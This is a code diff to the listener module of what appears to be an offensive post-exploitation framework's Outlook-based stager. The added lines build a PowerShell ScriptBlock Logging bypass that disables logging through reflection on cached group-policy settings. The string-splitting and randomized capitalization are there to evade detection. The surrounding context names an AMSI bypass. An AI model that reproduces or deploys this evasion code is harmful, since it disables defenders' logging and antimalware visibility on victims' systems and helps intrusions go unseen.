@@ -174,8 +174,18 @@ class Listener:
 
                 stager = ''
                 if safeChecks.lower() == 'true':
+                    # ScriptBlock Logging bypass
+                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += "'System.Management.Automation.Utils'"
+                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
+                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
+                    stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
                     stager += "$outlook = New-Object -comobject Outlook.Application;"
                     stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
                     stager += 'MAPI");'
